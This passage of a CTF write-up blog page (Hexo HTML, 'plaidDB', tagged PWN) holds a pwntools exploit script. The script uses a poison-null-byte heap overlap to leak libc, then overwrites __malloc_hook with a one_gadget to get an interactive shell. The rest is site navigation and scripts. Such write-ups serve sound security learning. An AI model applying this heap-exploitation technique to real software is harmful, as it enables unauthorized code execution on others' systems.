class="string">&quot;GET&quot;</span>)</span><br><span class="line">  io.sendlineafter(<span class="string">&quot;key&quot;</span>, key)</span><br><span class="line">  io.recvuntil(<span class="string">&quot;bytes]:\n&quot;</span>)</span><br><span class="line">  <span class="keyword">return</span> io.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DEL</span>(<span class="params">key</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&quot;command:&quot;</span>, <span class="string">&quot;DEL&quot;</span>)</span><br><span class="line">  io.sendlineafter(<span class="string">&quot;key&quot;</span>, key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_libc</span>():</span><br><span class="line">  <span class="keyword">global</span> libc_base</span><br><span class="line">  PUT(<span class="string">&quot;A&quot;</span>, <span class="number">0x71</span>, <span class="string">&quot;A&quot;</span>*<span class="number">0x70</span>)</span><br><span class="line">  PUT(<span class="string">&quot;B&quot;</span>, <span class="number">0x101</span>, <span class="string">&quot;B&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">  PUT(<span class="string">&quot;C&quot;</span>, <span class="number">0x81</span>, <span class="string">&quot;C&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">  PUT(<span class="string">&quot;def&quot;</span>, <span class="number">0x81</span>, <span class="string">&quot;d&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">#pause()</span></span><br><span class="line">  DEL(<span class="string">&quot;A&quot;</span>)</span><br><span class="line">  DEL(<span class="string">&quot;B&quot;</span>)</span><br><span class="line"> </span><br><span class="line">  log.info(<span class="string">&quot;delete b&quot;</span>)</span><br><span class="line">  <span class="comment">#pause()</span></span><br><span class="line">  PUT(<span class="string">&quot;A&quot;</span>*<span class="number">0x78</span>, <span class="number">0x31</span>, <span class="string">&quot;A&quot;</span>*<span class="number">0x30</span>)           <span class="comment"># posion null byte</span></span><br><span class="line">  </span><br><span class="line">  log.info(<span class="string">&quot;inject posion&quot;</span>)</span><br><span class="line">  <span class="comment">#pause()   </span></span><br><span class="line">  PUT(<span class="string">&quot;B1&quot;</span>, <span class="number">0x81</span>, <span class="string">&quot;X&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">  log.info(<span class="string">&quot;b1&quot;</span>)</span><br><span class="line">  <span class="comment">#pause()</span></span><br><span class="line">  PUT(<span class="string">&quot;B2&quot;</span>, <span class="number">0x41</span>, <span class="string">&quot;Y&quot;</span>*<span class="number">0x40</span>)</span><br><span class="line">  log.info(<span class="string">&quot;b2&quot;</span>)</span><br><span class="line">  <span class="comment">#pause()</span></span><br><span class="line">  DEL(<span class="string">&quot;B1&quot;</span>)</span><br><span class="line">  log.info(<span class="string">&quot;delete b1&quot;</span>)</span><br><span class="line">  <span class="comment">#pause()</span></span><br><span class="line">  DEL(<span class="string">&quot;C&quot;</span>)</span><br><span class="line">  log.info(<span class="string">&quot;delete c&quot;</span>)</span><br><span class="line">  <span class="comment">#gdb.attach(io)</span></span><br><span class="line">  <span class="comment">#pause()							# overlap chunkB2</span></span><br><span class="line"></span><br><span class="line">  PUT(<span class="string">&quot;B1&quot;</span>, <span class="number">0x81</span>, <span class="string">&quot;X&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">  log.info(<span class="string">&quot;put b1&quot;</span>)</span><br><span class="line">  <span class="comment"># pause()</span></span><br><span class="line">  libc_base = u64(GET(<span class="string">&quot;B2&quot;</span>)[:<span class="number">8</span>]) - <span class="number">0x19cb78</span></span><br><span class="line">  log.info(<span class="string">&quot;libc address: 0x%x&quot;</span> % libc_base)</span><br><span class="line">  <span class="comment">#pause()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">  one_gadget = libc_base + <span class="number">0x436e2</span></span><br><span class="line">  malloc_hook = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] + libc_base</span><br><span class="line">  log.info(<span class="string">&quot;malloc_hook address: 0x%x&quot;</span> % malloc_hook)</span><br><span class="line">  DEL(<span class="string">&quot;B1&quot;</span>)</span><br><span class="line">  payload  = p64(<span class="number">0</span>)*<span class="number">16</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">  payload += p64(<span class="number">0</span>)*<span class="number">12</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">  PUT(<span class="string">&quot;B1&quot;</span>, <span class="number">0x191</span>, payload.ljust(<span class="number">0x190</span>, <span class="string">b&quot;B&quot;</span>))</span><br><span class="line"></span><br><span class="line">  DEL(<span class="string">&quot;B2&quot;</span>)</span><br><span class="line">  DEL(<span class="string">&quot;B1&quot;</span>)</span><br><span class="line">  payload = p64(<span class="number">0</span>)*<span class="number">16</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(malloc_hook-<span class="number">0x13</span>)</span><br><span class="line">  PUT(<span class="string">&quot;B1&quot;</span>, <span class="number">0x191</span>, payload.ljust(<span class="number">0x190</span>, <span class="string">b&quot;B&quot;</span>))</span><br><span class="line"></span><br><span class="line">  PUT(<span class="string">&quot;D&quot;</span>, <span class="number">0X61</span>, <span class="string">&quot;D&quot;</span>*<span class="number">0x60</span>)</span><br><span class="line">  payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3</span> + p64(one_gadget)</span><br><span class="line">  PUT(<span class="string">&quot;E&quot;</span>, <span class="number">0X61</span>, payload.ljust(<span class="number">0x60</span>, <span class="string">b&quot;E&quot;</span>))</span><br><span class="line">  </span><br><span class="line">  io.sendline(<span class="string">&quot;GET&quot;</span>)</span><br><span class="line">  io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        PUT(<span class="built_in">str</span>(i), <span class="number">0x38</span>, <span class="built_in">str</span>(i)*<span class="number">0x37</span>)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        DEL(<span class="built_in">str</span>(i))</span><br><span class="line">  leak_libc()</span><br><span class="line">  pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> plaidDB</li>
+        <li><strong>Author:</strong> A1ex</li>
+        <li><strong>Created at
+                :</strong> 2025-12-24 10:59:16</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-04-05 18:05:21
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://havenoideal123.github.io/2025/12/24/plaidDB/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/PWN/">#PWN</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/12/30/tinypad/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">tinypad</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/12/22/asis-ctf2016-b00ks/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">asis-ctf2016-b00ks</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="giscus-container"></div>
+    <script data-swup-reload-script defer>
+        async function loadGiscus() {
+            const giscusConfig = {
+                'src': 'https://giscus.app/client.js',
+                'data-repo': 'havenoideal123/giscus_storage',
+                'data-repo-id': 'R_kgDOQMJJcA',
+                'data-category': 'Announcements',
+                'data-category-id': 'DIC_kwDOQMJJcM4CxQZl',
+                'data-mapping': 'pathname',
+                'data-strict': '0',
+                'data-reactions-enabled': '1',
+                'data-emit-metadata': '1',
+                'data-theme': 'preferred_color_scheme',
+                'data-lang': 'zh-CN',
+                'data-input-position': 'bottom',
+                'data-loading': 'not-lazy',
+                'crossorigin': 'anonymous',
+                'async': true
+            }
+            const giscusScript = document.createElement('script');
+            for (const key in giscusConfig) {
+                giscusScript.setAttribute(key, giscusConfig[key]);
+            }
+            document.getElementById('giscus-container').appendChild(giscusScript);
+        }
+        if ('true') {
+            let loadGiscusTimeout = setTimeout(() => {
+                loadGiscus();
+                clearTimeout(loadGiscusTimeout);
+            }, 1000);
+        } else {
+            document.addEventListener('DOMContentLoaded', loadGiscus);
+        }
+    </script>
+
+
+        
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">plaidDB</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WP"><span class="nav-text">WP</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">A1ex</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        23 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
